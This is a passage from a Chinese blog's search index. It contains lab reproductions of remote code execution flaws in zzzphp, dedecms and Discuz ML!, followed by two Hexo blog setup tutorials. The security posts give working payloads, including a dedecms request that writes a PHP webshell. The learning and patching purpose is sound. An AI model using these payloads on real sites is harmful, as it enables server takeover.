      <url>/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，<br>导致在后台可以写入php代码从而造成代码执行。</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建zzzphp V1.6.1环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141219.png" alt></p><p>在后台模块管理中的电脑模块找到cn2016<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141335.png" alt></p><p>然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为<br><code>{if:assert($_request[phpinfo()])}phpinfo();{end if}</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141523.png" alt></p><p>然后打开<code>http://xxx/zzzcms/search/</code>就可以看到我们刚刚输入的phpinfo()执行了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141748.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4471" target="_blank" rel="noopener">zzzphp V1.6.1 远程代码执行漏洞分析</a><br><a href="https://www.anquanke.com/post/id/173991" target="_blank" rel="noopener">zzzphpV1.6.1 远程代码执行漏洞简单分析</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> zzzphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms V5.7-UTF-8-SP2 命令执行漏洞复现</title>
      <link href="/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724101304.png" alt></p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>环境搭建这里不再赘述，搭建好后访问网站主页<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102343.png" alt></p><p>dedecms默认的后台是/dede,没有修改直接访问登陆<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102453.png" alt></p><p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102828.png" alt></p><p><strong>代码分析</strong></p><pre><code>(1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步(2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。(3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html*   [a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点   所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。(4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec(5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用(6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施，        导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了</code></pre><p>根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。</p><hr><h1 id="三-、漏洞复现"><a href="#三-、漏洞复现" class="headerlink" title="三 、漏洞复现"></a>三 、漏洞复现</h1><p>获取token，访问 域名 + /dede/tpl.php?action=upload<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104103.png" alt><br>然后查看网页源代码，找到token<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104145.png" alt><br>构造payload如下<br><a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)</a><br>访问了成功写入<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104653.png" alt><br>访问写入的文件，域名+include/taglib/（你上传的文件名）.lib.php<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104810.png" alt><br>也可以构造一句话木马payload，<a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929</a><br>直接用菜刀连接<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724105245.png" alt></p><hr><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>虽然这个漏洞很鸡肋，需要拿到管理员账号密码才行，但还是有必要复现了解，反复练习才能有进步。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01221" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a><br><a href="https://blog.csdn.net/qq_41954384/article/details/93057317" target="_blank" rel="noopener">dedeCMS后台代码执行漏洞-CNVD-2018-01221</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> dedecms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz ML! V3.X 代码注入漏洞复现</title>
      <link href="/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，<br>攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，<br>进行远程代码执行利用，该漏洞利用方式简单，危害性较大。<br>本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p><p><strong>漏洞影响版本：</strong><br>Discuz!ML v.3.4 、Discuz!ML v.3.2 、Discuz!ML v.3.3 product of codersclub.org</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建Discuz！ML 环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724113043.png" alt></p><p>在主页进行抓包，修改Language的值，添加  <code>&#39;.phpinfo().&#39;</code><br>成功复现该漏洞<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724114153.png" alt></p><hr><h1 id="三、漏洞修复"><a href="#三、漏洞修复" class="headerlink" title="三、漏洞修复"></a>三、漏洞修复</h1><p>由于代码包含的原因，所以注入到缓存文件中的恶意代码直接执行，其中首页就有包涵，<br>全局搜索一下的话，应该有不少地方有进行包含可以直接利用，危害很大。<br>VulkeyChen师傅的建议：单看语言这个点，在/source/class/discuz/discuz_application.php<br>第338行之后341行之前加入该代码暂缓此安全问题：</p><pre><code>$lng = str_replace(&quot;(&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;)&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;&#39;&quot;,&quot;&quot;,$lng);$lng = str_replace(&#39;&quot;&#39;,&quot;&quot;,$lng);$lng = str_replace(&#39;`&#39;,&quot;&quot;,$lng);</code></pre><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://blog.topsec.com.cn/discuz-ml-v3-x-代码注入漏洞深度分析/" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a><br><a href="https://www.cnblogs.com/-mo-/p/11180396.html" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github分支备份hexo</title>
      <link href="/2019/07/05/github-fen-zhi-bei-fen-hexo/"/>
      <url>/2019/07/05/github-fen-zhi-bei-fen-hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>使用hexo搭建个人博客框架，配置起来有些消耗时间，管理起来也不是特别方便。特别是有时需要在其他电脑上写博客时，就让人头疼。所以我们就利用Github的分支，来备份hexo，方便快速搭上手写博客。</p><hr><h1 id="二、创建本地分支目录"><a href="#二、创建本地分支目录" class="headerlink" title="二、创建本地分支目录"></a>二、创建本地分支目录</h1><h2 id="1-新建文件夹存放分支工作目录。"><a href="#1-新建文件夹存放分支工作目录。" class="headerlink" title="1. 新建文件夹存放分支工作目录。"></a>1. 新建文件夹存放分支工作目录。</h2><p><code>mkdir hexo</code></p><h2 id="2-把你的GitHub的远程仓库克隆到hexo文件夹"><a href="#2-把你的GitHub的远程仓库克隆到hexo文件夹" class="headerlink" title="2. 把你的GitHub的远程仓库克隆到hexo文件夹"></a>2. 把你的GitHub的远程仓库克隆到hexo文件夹</h2><p><code>git clone https://github.com/yourusername/yourusername.github.io hexo</code></p><h2 id="3-删除除了版本管理的-git之外的所有文件和文件夹"><a href="#3-删除除了版本管理的-git之外的所有文件和文件夹" class="headerlink" title="3. 删除除了版本管理的.git之外的所有文件和文件夹"></a>3. 删除除了版本管理的.git之外的所有文件和文件夹</h2><pre><code>cd hexorm -r *</code></pre><h2 id="4-把要备份的文件复制到hexo目录"><a href="#4-把要备份的文件复制到hexo目录" class="headerlink" title="4. 把要备份的文件复制到hexo目录"></a>4. 把要备份的文件复制到hexo目录</h2><pre><code>scaffolds/source/themes/.git/.gitignore_config.ymlpackage.json</code></pre><blockquote><p>注意：<br>如果使用的主题是从Github克隆的，那么使用命令删除它的Git文件（以next主题为例）<br><code>rm -R themes/next/.git*</code></p></blockquote><hr><h1 id="三、创建分支"><a href="#三、创建分支" class="headerlink" title="三、创建分支"></a>三、创建分支</h1><h2 id="1-新建仓库"><a href="#1-新建仓库" class="headerlink" title="1. 新建仓库"></a>1. 新建仓库</h2><p>在blog项目仓库下，输入备份分支hexo，点击create创建（因为我已经创建过了，所以显示的不一样）<br>或者在本地使用命令 <code>git checkout -b hexo</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705133032.png" alt></p><h2 id="2-点击设置，把默认分支设置为新建的备份分支"><a href="#2-点击设置，把默认分支设置为新建的备份分支" class="headerlink" title="2. 点击设置，把默认分支设置为新建的备份分支"></a>2. 点击设置，把默认分支设置为新建的备份分支</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132053.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132123.png" alt></p><hr><h1 id="四、提交备份"><a href="#四、提交备份" class="headerlink" title="四、提交备份"></a>四、提交备份</h1><p>在本地的hexo文件夹打开git bash，依次执行以下命令：</p><pre><code>git add -all   #保存所有文件到暂存区git commit -m &quot;创建hexo分支&quot; #提交变更git push --set-upstream origin hexo#推送到Github，并用`--set-upstream`与origin创建关联#将hexo设置为默认分区</code></pre><hr><h1 id="五、合并管理"><a href="#五、合并管理" class="headerlink" title="五、合并管理"></a>五、合并管理</h1><p>将本地hexo分支中的.git文件夹复制到博客根目录中，<br>我们只需要手动管理hexo分支中的文件（备份），<br>.gitignore之外的文件由hexo管理（hexo d）<br>移除主题目录下的Git管理文件</p><p><code>rm -R themes/next/.git* #以next主题为例</code></p><p>master分支的文件则由hexo管理，编辑hexo配置文件<em>_config.yml</em></p><pre><code>deploy:        type: git        repo: https://github.com/yourusername/yourusername.github.io        branch: master</code></pre><hr><h1 id="六、发表文章及修改配置"><a href="#六、发表文章及修改配置" class="headerlink" title="六、发表文章及修改配置"></a>六、发表文章及修改配置</h1><h2 id="1-将相关更改（配置修改或发表文章）推送到hexo分支"><a href="#1-将相关更改（配置修改或发表文章）推送到hexo分支" class="headerlink" title="1. 将相关更改（配置修改或发表文章）推送到hexo分支"></a>1. 将相关更改（配置修改或发表文章）推送到hexo分支</h2><pre><code>git add .git commit -m &quot;修改配置/发表文章&quot;git push origin hexo</code></pre><h2 id="2-将静态文件推送到master分支"><a href="#2-将静态文件推送到master分支" class="headerlink" title="2. 将静态文件推送到master分支"></a>2. 将静态文件推送到master分支</h2><pre><code>hexo clean hexo ghexo d</code></pre><hr><h1 id="七、迁移"><a href="#七、迁移" class="headerlink" title="七、迁移"></a>七、迁移</h1><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><pre><code>npm install -g hexo-clihexo initnpm install</code></pre><h2 id="2-克隆hexo分支"><a href="#2-克隆hexo分支" class="headerlink" title="2. 克隆hexo分支"></a>2. 克隆hexo分支</h2><p><code>git clone -b hexo https://github.com/username/username.github.io</code></p><hr><p>这样就可以进行写作了，写完记得同步备份博客。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/white_idiot/article/details/80685990" target="_blank" rel="noopener">【GitHub】创建Git分支将Hexo博客迁移到其它电脑</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> hexo </tag>
            
            <tag> 备份 </tag>
            
            <tag> 分支 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages+Hexo搭建个人博客（踩坑之路）</title>
      <link href="/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/"/>
      <url>/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实很早之前就想搭建一个个人博客，出于各种原因，一直没有行动。最近终于着手开始搭建，希望自己可以一直坚持下去。在搭建的过程中，踩了不少坑，特此记录，也希望对后来人有一点点参考价值。</p><hr><h1 id="一、Github"><a href="#一、Github" class="headerlink" title="一、Github"></a>一、Github</h1><h2 id="1-注册Github账号"><a href="#1-注册Github账号" class="headerlink" title="1. 注册Github账号"></a>1. 注册Github账号</h2><p>进入<a href="https://github.com" target="_blank" rel="noopener">Github</a>官网，注册账号。</p><h2 id="2-创建仓库"><a href="#2-创建仓库" class="headerlink" title="2. 创建仓库"></a>2. 创建仓库</h2><p>点击首页右上角头像左侧的头像<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705010509.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011051.png" alt></p><h2 id="3-Github-Pages"><a href="#3-Github-Pages" class="headerlink" title="3. Github Pages"></a>3. Github Pages</h2><p>点击Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011609.png" alt><br>找到GitHub Pages，以用户名命名的仓库自动开启github pages，确认开启后就可以通过给出的网址访问了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011514.png" alt></p><hr><h1 id="二、Hexo"><a href="#二、Hexo" class="headerlink" title="二、Hexo"></a>二、Hexo</h1><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">hexo</a>是一个快速、简洁且高效的博客框架，可以参考官方文档。</p><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><p>要使用hexo，必须安装<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node.js</a>和<a href="https://git-scm.com/download/" target="_blank" rel="noopener">Git</a>。网上教程很多，这里不再赘述。</p><h2 id="2-hexo安装"><a href="#2-hexo安装" class="headerlink" title="2. hexo安装"></a>2. hexo安装</h2><p>先创建存放blog文件的文件夹，切换到此文件夹右击git bash打开<br>输入命令安装hexo：<br><code>npm install -g hexo-cli</code></p><p>依次执行：</p><pre><code>hexo init npm installhexo g #生成静态网页hexo s #启动本地服务</code></pre><p>完成后，在浏览器输入localhost:4000就可以看到你的博客了</p><hr><h1 id="三、部署到Github"><a href="#三、部署到Github" class="headerlink" title="三、部署到Github"></a>三、部署到Github</h1><h2 id="1-设置SSH"><a href="#1-设置SSH" class="headerlink" title="1. 设置SSH"></a>1. 设置SSH</h2><p>返回GIt Bash中，依次输入：</p><pre><code>git config --global.name &quot;yourname&quot;git config --global.email &quot;youremail&quot;</code></pre><p>这里的yourname输入你的Github的用户名，<br>youremail输入你的Github邮箱</p><pre><code>cd ~/.sshlsmkdir key_backupcp id_rsa* key_backuprm id_rsa*#检查有没有生成过SSH并备份移除ssh-keygen -t rsa -C &quot;youremail&quot; #生成新的SSH，接下来输入密码 一路回车</code></pre><h2 id="2-添加SSH-Key到Github"><a href="#2-添加SSH-Key到Github" class="headerlink" title="2.添加SSH Key到Github"></a>2.添加SSH Key到Github</h2><p>点击头像，选择Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022259.png" alt><br>添加新的SSH Key<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022426.png" alt><br>找到c:\users\当前用户名.ssh    文本形式打开id_ras.pub (打开系统查看隐藏文件选项)<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022656.png" alt><br>测试是否连接成功<br><code>ssh -T git@github.com</code><br>输入yes就ok</p><h2 id="3-部署到Github"><a href="#3-部署到Github" class="headerlink" title="3. 部署到Github"></a>3. 部署到Github</h2><p>打开hexo配置文件（根目录）<strong>_config.yml</strong><br>翻到最后将xxx修改为你的Github账户（冒号后面有一个空格）</p><pre><code>deploy:    type: git    repo: https://github.com/xxx/xxx.github.io.git    branch: master</code></pre><p>然后安装deploy-git(不然报错”ERROR Deployer not found: git“)<br><code>npm install hexo-deployer-git --save</code></p><p>然后</p><pre><code>hexo cleanhexo ghexo d</code></pre><p>deploy时可能要你输入密码，再刷新username.github.io就可以看到你的blog。</p><hr><p><strong>注意：</strong></p><blockquote><p>如果输入命令的过程中出现了”LF will be replaced by CRLF”报错，<br>    1. windows中的换行符为 CRLF，而在Linux下的换行符为LF，所以在执行add . 时出现提示<br>    2. CRLF和LF是两种不同的换行格式，git工作区默认为CRLF来作为换行符，<br>        所以当我们项目文件里有用的地方使用LF作为换行符，这个时候我们再继续git add<br>        或者git commit的时候就会弹出警告，当最终push到远程仓库的时候git会统一格式全部转化为用CRLF作为换行符 </p></blockquote><p><strong>解决办法：</strong></p><blockquote><ol><li>这个只是一个警告，我们直接忽略就好。</li><li>git config –global core.autocrlf false  //禁用自动转换 </li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> GitHub </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
